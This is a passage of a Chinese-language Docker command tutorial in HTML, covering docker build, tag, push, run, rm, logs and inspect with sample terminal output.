class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs ruby">➜  test docker build -t my-nginx-image .<br>[+] <span class="hljs-title class_">Building</span> <span class="hljs-number">74</span>.9s (<span class="hljs-number">8</span>/<span class="hljs-number">8</span>) <span class="hljs-variable constant_">FINISHED</span>                                                                                                                                           <br> =&gt; [internal] load build definition from <span class="hljs-title class_">Dockerfile</span>                                                                                                                   <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; transferring <span class="hljs-symbol">dockerfile:</span> 491B                                                                                                                                   <span class="hljs-number">0</span>.0s<br> =&gt; [internal] load .dockerignore                                                                                                                                      <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; transferring <span class="hljs-symbol">context:</span> 2B                                                                                                                                        <span class="hljs-number">0</span>.0s<br> =&gt; [internal] load metadata for docker.io/library/<span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span>                                                                                                        <span class="hljs-number">1</span>.4s<br> =&gt; [<span class="hljs-number">1</span>/<span class="hljs-number">3</span>] <span class="hljs-variable constant_">FROM</span> docker.io/library/<span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span><span class="hljs-variable">@sha256</span><span class="hljs-symbol">:</span>626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322                                                 <span class="hljs-number">23</span>.4s<br> =&gt; =&gt; resolve docker.io/library/<span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span><span class="hljs-variable">@sha256</span><span class="hljs-symbol">:</span>626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322                                                  <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322 <span class="hljs-number">1</span>.42kB / <span class="hljs-number">1</span>.42kB                                                                         <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>26c3bd3ae441c873a210200bcbb975ffd2bbf0c0841a4584f4476c8a5b8f3d99 529B / 529B                                                                             <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>d5ca7a4456053674d490803005766890dd19e3f7e789a48737c0d462da531f5d <span class="hljs-number">1</span>.48kB / <span class="hljs-number">1</span>.48kB                                                                         <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>a39c84e173f038958d338f55a9e8ee64bb6643e8ac6ae98e08ca65146e668d86 <span class="hljs-number">27</span>.17MB / <span class="hljs-number">27</span>.17MB                                                                      <span class="hljs-number">22</span>.6s<br> =&gt; =&gt; extracting <span class="hljs-symbol">sha256:</span>a39c84e173f038958d338f55a9e8ee64bb6643e8ac6ae98e08ca65146e668d86                                                                              <span class="hljs-number">0</span>.7s<br> =&gt; [internal] load build context                                                                                                                                      <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; transferring <span class="hljs-symbol">context:</span> 255B                                                                                                                                      <span class="hljs-number">0</span>.0s<br> =&gt; [<span class="hljs-number">2</span>/<span class="hljs-number">3</span>] <span class="hljs-variable constant_">RUN</span> apt-get update &amp;&amp; apt-get install -y     nginx     &amp;&amp; rm -rf /var/lib/apt/lists/*                                                                       <span class="hljs-number">49</span>.7s<br> =&gt; [<span class="hljs-number">3</span>/<span class="hljs-number">3</span>] <span class="hljs-variable constant_">COPY</span> index.html /var/www/html/                                                                                                                               <span class="hljs-number">0</span>.0s <br> =&gt; exporting to image                                                                                                                                                 <span class="hljs-number">0</span>.2s <br> =&gt; =&gt; exporting layers                                                                                                                                                <span class="hljs-number">0</span>.2s <br> =&gt; =&gt; writing image <span class="hljs-symbol">sha256:</span>fd09b8e38b0e75b933c83996e55146d4a59e2c62b13c0daec733177186923b39                                                                           <span class="hljs-number">0</span>.0s <br> =&gt; =&gt; naming to docker.io/library/my-nginx-image  <br></code></pre></td></tr></table></figure><h2 id="添加TAG"><a href="#添加TAG" class="headerlink" title="添加TAG"></a>添加TAG</h2><h3 id="docker-tag"><a href="#docker-tag" class="headerlink" title="docker tag"></a>docker tag</h3><p><strong>docker tag 镜像名称:镜像版本 镜像新名称:镜像新版本</strong></p><h4 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h4><p>为镜像设置tag</p><h4 id="OPTIONS-5"><a href="#OPTIONS-5" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h4 id="实例-6"><a href="#实例-6" class="headerlink" title="实例"></a>实例</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># docker images</span><br>REPOSITORY        <span class="hljs-keyword">TAG</span>       <span class="hljs-title">IMAGE</span> ID       CREATED        SIZE<br>grafana/grafana   <span class="hljs-number">8.2</span>.<span class="hljs-number">6</span>     aeeaa96eea83   <span class="hljs-number">9</span> months ago   <span class="hljs-number">253M</span>B<br>grafana/grafana   <span class="hljs-number">6.3</span>.<span class="hljs-number">3</span>     a6e14b4109af   <span class="hljs-number">3</span> years ago    <span class="hljs-number">253M</span>B<br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># docker tag grafana/grafana:8.2.6 grafana:8.2.6.1</span><br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># docker images</span><br>REPOSITORY        <span class="hljs-keyword">TAG</span>       <span class="hljs-title">IMAGE</span> ID       CREATED        SIZE<br>grafana/grafana   <span class="hljs-number">8.2</span>.<span class="hljs-number">6</span>     aeeaa96eea83   <span class="hljs-number">9</span> months ago   <span class="hljs-number">253M</span>B<br>grafana           <span class="hljs-number">8.2</span>.<span class="hljs-number">6.1</span>   aeeaa96eea83   <span class="hljs-number">9</span> months ago   <span class="hljs-number">253M</span>B<br>grafana/grafana   <span class="hljs-number">6.3</span>.<span class="hljs-number">3</span>     a6e14b4109af   <span class="hljs-number">3</span> years ago    <span class="hljs-number">253M</span>B<br></code></pre></td></tr></table></figure><h2 id="上传镜像"><a href="#上传镜像" class="headerlink" title="上传镜像"></a>上传镜像</h2><h3 id="docker-push"><a href="#docker-push" class="headerlink" title="docker push"></a><strong>docker push</strong></h3><p><strong>docker push [OPTIONS] NAME[:TAG]</strong></p><h4 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h4><p>上传镜像到远程镜像仓库</p><h4 id="OPTIONS-6"><a href="#OPTIONS-6" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="a"><a href="#a" class="headerlink" title="-a"></a>-a</h5><p>–all-tags 上传所有tag的镜像到仓库</p><p>–disable-content-trust  关闭镜像签名校验，默认校验</p><p>-q</p><p>–quiet Suppress verbose output</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  / docker push registry<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/hours/my-nginx-image:<span class="hljs-number">2.0</span>                                    <br>The push refers to repository <span class="hljs-selector-attr">[registry.xxx.xxx.xxx.xxx/hours/my-nginx-image]</span><br><span class="hljs-number">0</span>c192a2bcb80: Pushed <br>bed1f48a7b1b: Pushed <br><span class="hljs-number">350</span>f36b271de: Layer already exists <br><span class="hljs-number">2.0</span>: digest: sha256:c0b08d64470340b8fc730b795e0d99f78da1595d5443ab97e7b51ab8bd057022 size: <span class="hljs-number">948</span><br>➜  / docker push registry<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/hours/my-nginx-image:<span class="hljs-number">2.0</span> -<span class="hljs-selector-tag">q</span><br>registry<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/hours/my-nginx-image:<span class="hljs-number">2.0</span><br></code></pre></td></tr></table></figure><h5 id="NAME-TAG"><a href="#NAME-TAG" class="headerlink" title="NAME[:TAG]"></a>NAME[:TAG]</h5><p>指定需要上传的镜像名或指定镜像TAG</p><p>不指定TAG，则使用默认TAG：latest</p><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><h6 id="不指定镜像仓库"><a href="#不指定镜像仓库" class="headerlink" title="不指定镜像仓库"></a>不指定镜像仓库</h6><p>默认会上传到 docker.io</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">➜  / docker push my-nginx-image<br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> tag: latest<br>The push refers <span class="hljs-keyword">to</span> repository [docker.io/library/my-nginx-image]<br><span class="hljs-number">0</span>c192a2bcb80: Preparing <br><span class="hljs-symbol">bed1f48a7b1b:</span> Preparing <br><span class="hljs-number">350</span>f36b271de: Preparing <br><span class="hljs-symbol">denied:</span> requested access <span class="hljs-keyword">to</span> the resource <span class="hljs-built_in">is</span> denied<br></code></pre></td></tr></table></figure><h6 id="指定镜像仓库"><a href="#指定镜像仓库" class="headerlink" title="指定镜像仓库"></a>指定镜像仓库</h6><p>仓库域名&#x2F;项目名&#x2F;镜像名[:tag]</p><p>registry.xxx.xxx.xxx.xxx&#x2F;waf&#x2F;my-nginx-image:latest</p><h5 id="实例-7"><a href="#实例-7" class="headerlink" title="实例"></a>实例</h5><p>1、镜像添加tag</p><p>docker tag 镜像名:tag 仓库域名&#x2F;项目名&#x2F;镜像名:tag</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">➜  / docker tag <span class="hljs-keyword">my</span>-nginx-image:latest registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image:<span class="hljs-number">2.0</span><br><br>➜  / docker images | <span class="hljs-keyword">grep</span> <span class="hljs-number">2.0</span>     <br>registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image     <span class="hljs-number">2.0</span>          fd09b8e38b0e   <span class="hljs-number">5</span> days ago      <span class="hljs-number">123</span>MB<br></code></pre></td></tr></table></figure><p>2、上传镜像</p><p>可能需要登录，如果没有登录会提示（unauthorized: unauthorized to access repository: waf&#x2F;my-nginx-image, action: push: unauthorized to access repository: waf&#x2F;my-nginx-image, action: push）</p><p>docker push 仓库域名&#x2F;项目名&#x2F;镜像名:tag</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">➜  / docker <span class="hljs-keyword">push</span> registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image:<span class="hljs-number">2.0</span>                                    <br>The <span class="hljs-keyword">push</span> refers to repository [registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image]<br>0c192a2bcb8<span class="hljs-number">0</span>: Pushed <br>bed1f48a7b1b: Pushed <br><span class="hljs-number">350</span>f36b271de: Layer already <span class="hljs-keyword">exists</span> <br><span class="hljs-number">2.0</span>: digest: sha256:c0b08d64470340b8fc730b795e0d99f78da1595d5443ab97e7b51ab8bd057022 size: <span class="hljs-number">948</span><br></code></pre></td></tr></table></figure><h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><h2 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h2><h3 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h3><p><strong>docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</strong></p><p>docker run -itd  -p port1:port2 -v &#x2F;path:&#x2F;path IMAGE</p><p>dockerdocker二进制文件</p><p>run运行docker容器命令</p><h4 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h4><p>创建并运行容器</p><h4 id="OPTIONS-7"><a href="#OPTIONS-7" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="–name-Name"><a href="#–name-Name" class="headerlink" title="–name  Name"></a>–name  Name</h5><p>设置容器名称</p><h5 id="i，–interactive"><a href="#i，–interactive" class="headerlink" title="-i，–interactive"></a>-i，–interactive</h5><p>Keep STDIN open even if not attached  为容器创建终端，即使没有连接</p><h5 id="t，–tty"><a href="#t，–tty" class="headerlink" title="-t，–tty"></a>-t，–tty</h5><p>Allocate a pseudo-TTY 为容器分配伪终端，允许你对容器内的标准输入进行交互</p><h5 id="d，–detch"><a href="#d，–detch" class="headerlink" title="-d，–detch"></a>-d，–detch</h5><p>Run container in background and print container ID  创建的容器运行在后台，输出容器id</p><h5 id="–rm"><a href="#–rm" class="headerlink" title="–rm"></a>–rm</h5><p>容器退出时自动清理容器内部的文件系统，不可与 -d 命令同时使用</p><p>只能自动清理 foreground 容器，不可自动清理 detached 容器，也会清理容器的匿名 data volumes</p><p>等价于容器退出后，执行 docker rm -v</p><h5 id="port1"><a href="#port1" class="headerlink" title="port1"></a>port1</h5><p>容器外端口，宿主机端口</p><h5 id="port2"><a href="#port2" class="headerlink" title="port2"></a>port2</h5><p>容器内端口</p><h5 id="IMAGE"><a href="#IMAGE" class="headerlink" title="IMAGE"></a>IMAGE</h5><p>镜像名</p><h5 id="v-path1-path2"><a href="#v-path1-path2" class="headerlink" title="-v &#x2F;path1:&#x2F;path2"></a>-v &#x2F;path1:&#x2F;path2</h5><p>挂载目录  &#x2F;path1 宿主机目录  &#x2F;path2 容器目录，也就是将宿主机挂载到容器中</p><h4 id="COMMAND"><a href="#COMMAND" class="headerlink" title="COMMAND"></a>COMMAND</h4><p>制定执行的命令，例如 &#x2F;bin&#x2F;bash 指定使用的bash</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  docker run -itd -<span class="hljs-keyword">p</span> <span class="hljs-number">8888</span>:<span class="hljs-number">80</span> -v /Users/admin/<span class="hljs-keyword">opt</span>/docker/:/<span class="hljs-keyword">opt</span>/ cento<span class="hljs-variable">s:7</span><br>Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">find</span> image <span class="hljs-string">&#x27;centos:7&#x27;</span> locally<br><span class="hljs-number">7</span>: Pulling from library/centos<br><span class="hljs-number">6717</span>b8ec66cd: Pull <span class="hljs-built_in">complete</span> <br>Digest: <span class="hljs-built_in">sha256</span>:c73f515d06b0fa07bb18d8202035e739a494ce760aa73129f60f4bf2bd22b407<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> cento<span class="hljs-variable">s:7</span><br><span class="hljs-number">0</span>fc471d9378c722e269c16673297223a77f1ba482bd67f0a4ad5f904bc9bd93f<br>➜  docker docker <span class="hljs-keyword">ps</span><br>CONTAINER ID   IMAGE      COMMAND       CREATED         STATUS         PORTS                  NAMES<br><span class="hljs-number">0</span>fc471d9378c   cento<span class="hljs-variable">s:7</span>   <span class="hljs-string">&quot;/bin/bash&quot;</span>   <span class="hljs-number">5</span> seconds ago   Up <span class="hljs-number">5</span> seconds   <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8888</span>-&gt;<span class="hljs-number">80</span>/tcp   gifted_banach<br></code></pre></td></tr></table></figure><h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><h3 id="docker-rm"><a href="#docker-rm" class="headerlink" title="docker rm"></a>docker rm</h3><p>docker rm id</p><h4 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h4><p>删除指定容器</p><h4 id="实例-8"><a href="#实例-8" class="headerlink" title="实例"></a>实例</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">(base) root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># docker rm dbea3aafd585</span><br>dbea3aafd585<br></code></pre></td></tr></table></figure><h2 id="查看容器日志"><a href="#查看容器日志" class="headerlink" title="查看容器日志"></a>查看容器日志</h2><p><strong>docker logs [-f] id</strong></p><h3 id="docker-logs"><a href="#docker-logs" class="headerlink" title="docker logs"></a>docker logs</h3><h4 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a>描述</h4><p>查看容器的日志信息</p><h4 id="OPTIONS-8"><a href="#OPTIONS-8" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f-1"><a href="#f-1" class="headerlink" title="-f"></a>-f</h5><p>查看实时日志</p><h4 id="实例-9"><a href="#实例-9" class="headerlink" title="实例"></a>实例</h4><p>查看实时日志</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs css">➜  /tmp docker logs -f <span class="hljs-number">61804</span>e0083af<br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br></code></pre></td></tr></table></figure><h2 id="查看容器元数据"><a href="#查看容器元数据" class="headerlink" title="查看容器元数据"></a>查看容器元数据</h2><p><strong>docker inspect [OPTIONS] Name|Id</strong></p><h3 id="docker-inspect-1"><a href="#docker-inspect-1" class="headerlink" title="docker inspect"></a>docker inspect</h3><h4 id="描述-12"><a href="#描述-12" class="headerlink" title="描述"></a>描述</h4><p>查看容器的基础数据</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-meta"># docker inspect 4b0e2ed242e0</span><br>[<br>    &#123;<br>        <span class="hljs-string">&quot;Id&quot;</span>: <span class="hljs-string">&quot;4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1&quot;</span>,<br>        <span class="hljs-string">&quot;Created&quot;</span>: <span class="hljs-string">&quot;2022-09-16T01:30:49.271281387Z&quot;</span>,<br>        <span class="hljs-string">&quot;Path&quot;</span>: <span class="hljs-string">&quot;/run.sh&quot;</span>,<br>        <span class="hljs-string">&quot;Args&quot;</span>: [],<br>        <span class="hljs-string">&quot;State&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Status&quot;</span>: <span class="hljs-string">&quot;running&quot;</span>,<br>            <span class="hljs-string">&quot;Running&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;Paused&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Restarting&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OOMKilled&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Dead&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Pid&quot;</span>: <span class="hljs-number">1272</span>,<br>            <span class="hljs-string">&quot;ExitCode&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;Error&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;StartedAt&quot;</span>: <span class="hljs-string">&quot;2022-09-16T01:30:49.547993902Z&quot;</span>,<br>            <span class="hljs-string">&quot;FinishedAt&quot;</span>: <span class="hljs-string">&quot;0001-01-01T00:00:00Z&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:aeeaa96eea830b988643e495b3978bff65dbdb997cc938ff5a4185a6bf3d7839&quot;</span>,<br>        <span class="hljs-string">&quot;ResolvConfPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/resolv.conf&quot;</span>,<br>        <span class="hljs-string">&quot;HostnamePath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/hostname&quot;</span>,<br>        <span class="hljs-string">&quot;HostsPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/hosts&quot;</span>,<br>        <span class="hljs-string">&quot;LogPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1-json.log&quot;</span>,<br>        <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;/amazing_brahmagupta&quot;</span>,<br>        <span class="hljs-string">&quot;RestartCount&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;Driver&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span>,<br>        <span class="hljs-string">&quot;Platform&quot;</span>: <span class="hljs-string">&quot;linux&quot;</span>,<br>        <span class="hljs-string">&quot;MountLabel&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;ProcessLabel&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;AppArmorProfile&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;ExecIDs&quot;</span>: <span class="hljs-literal">null</span>,<br>        <span class="hljs-string">&quot;HostConfig&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Binds&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;ContainerIDFile&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;LogConfig&quot;</span>: &#123;<br>                <span 